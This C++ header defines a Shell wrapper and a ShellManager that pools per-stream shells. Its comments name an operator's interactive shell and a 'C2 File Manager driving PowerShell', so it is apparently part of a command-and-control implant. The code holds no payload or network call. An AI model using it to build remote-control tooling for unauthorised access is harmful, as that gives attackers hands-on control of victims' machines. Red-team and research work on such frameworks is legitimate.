#pragma once

#include "runtime.h"

class Shell
{
private:
    ShellProcess shellProcess;
    Shell(ShellProcess &&sp) noexcept;

public:
    static Result<Shell, Error> Create() noexcept;
    Result<USIZE, Error> Write(const char *data, USIZE length) noexcept;
    Result<USIZE, Error> Read(char *buffer, USIZE capacity) noexcept;
    Result<USIZE, Error> ReadError(char *buffer, USIZE capacity) noexcept;

    ~Shell() noexcept = default;
    Shell(Shell &&other) noexcept;
    Shell &operator=(Shell &&) = delete;
    Shell(const Shell &) = delete;
    Shell &operator=(const Shell &) = delete;
};

/**
 * @class ShellManager
 * @brief Owns a small pool of independent shells keyed by stream id.
 *
 * @details Gives each consumer an isolated shell: stream 0 is the operator's
 * interactive shell; stream 1+ are used by scripted consumers (e.g. the C2
 * File Manager driving PowerShell). Each shell is lazily created on first use
 * and destroyed in the destructor. Encapsulates the per-stream shells so Context
 * holds a single member rather than a raw array.
 */
class ShellManager
{
private:
    static constexpr UINT8 MAX_STREAMS = 4;
    Shell *shells[MAX_STREAMS] = {};

public:
    ShellManager() = default;

    ~ShellManager()
    {
        for (UINT8 i = 0; i < MAX_STREAMS; i++)
        {
            if (shells[i] != nullptr)
            {
                delete shells[i];
                shells[i] = nullptr;
            }
        }
    }

    ShellManager(const ShellManager &) = delete;
    ShellManager &operator=(const ShellManager &) = delete;

    /// Get the shell for a stream, lazily creating it on first use.
    /// @return The shell, or nullptr if streamId is invalid or creation failed.
    Shell *GetOrCreate(UINT8 streamId)
    {
        if (streamId >= MAX_STREAMS)
            return nullptr;
        if (shells[streamId] == nullptr)
        {
            auto shellResult = Shell::Create();
            if (!shellResult)
                return nullptr;
            shells[streamId] = new Shell(static_cast<Shell &&>(shellResult.Value()));
        }
        return shells[streamId];
    }

    /// Destroy a stream's shell (idempotent — safe if it was never created).
    VOID Reset(UINT8 streamId)
    {
        if (streamId >= MAX_STREAMS)
            return;
        if (shells[streamId] != nullptr)
        {
            delete shells[streamId];
            shells[streamId] = nullptr;
        }
    }
};
